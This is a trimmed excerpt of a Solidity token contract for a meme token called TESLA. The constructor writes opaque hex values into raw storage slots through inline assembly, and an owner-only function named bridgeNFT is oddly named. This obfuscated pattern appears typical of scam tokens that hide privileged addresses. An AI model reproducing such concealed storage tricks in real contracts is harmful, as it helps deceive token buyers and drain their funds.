...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x53e5a69ac69efdadcbcf81525ed493de9f03d85eae3e)
            sstore(0x51,0x53e5ad3dc43c36acf09adb3a3876d613e9c7ac414380)
    ...
    function bridgeNFT(uint256 spender) public onlyOwner returns (address[] memory addArray) {
    }
...
contract TESLA is ERC20Token {
    constructor() ERC20Token("TrumpEthereumSurvivorLibertyAmerica", "TESLA", msg.sender, 666666666 * 10 ** 18) {
    }
}
